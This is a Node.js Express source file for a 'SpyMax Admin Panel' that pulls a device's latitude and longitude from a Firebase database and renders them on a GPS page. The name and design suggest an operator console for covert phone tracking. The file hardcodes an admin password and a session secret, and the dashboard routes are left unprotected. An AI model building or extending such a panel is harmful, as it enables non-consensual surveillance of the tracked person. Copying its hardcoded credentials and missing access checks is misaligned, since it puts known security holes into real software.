const express = require("express");
const path = require("path");
const bodyParser = require("body-parser");
const session = require("express-session");
const flash = require("connect-flash");
const app = express();

// Firebase Admin SDK Setup
const admin = require("firebase-admin");
const serviceAccount = require("./firebase-config.json");

admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
  databaseURL: "https://spymax-813e6.firebaseio.com"
});

// View Engine Setup
app.set("view engine", "ejs");
app.set("views", path.join(__dirname, "views"));

// Middlewares
app.use(express.static(path.join(__dirname, "public")));
app.use(bodyParser.urlencoded({ extended: false }));
app.use(session({
  secret: "spymaxsecret",
  resave: false,
  saveUninitialized: true,
}));
app.use(flash());

// Routes
app.get("/", (req, res) => {
  res.redirect("/login");
});

app.get("/login", (req, res) => {
  res.render("login", { error: null });
});

app.post("/login", (req, res) => {
  const { username, password } = req.body;
  if (username === "admin" && password === "123456") {
    res.redirect("/dashboard");
  } else {
    res.render("login", { error: "Invalid username or password" });
  }
});

app.get("/dashboard", (req, res) => {
  res.render("dashboard");
});

// GPS Page Route
app.get("/gps", async (req, res) => {
  try {
    const db = admin.database();
    const ref = db.ref("location"); // Adjust path if needed
    ref.once("value", (snapshot) => {
      const data = snapshot.val();
      const latitude = data?.latitude || null;
      const longitude = data?.longitude || null;
      res.render("gps", { latitude, longitude });
    });
  } catch (error) {
    console.error("Error fetching location:", error);
    res.render("gps", { latitude: null, longitude: null });
  }
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`SpyMax Admin Panel running on port ${PORT}`);
});
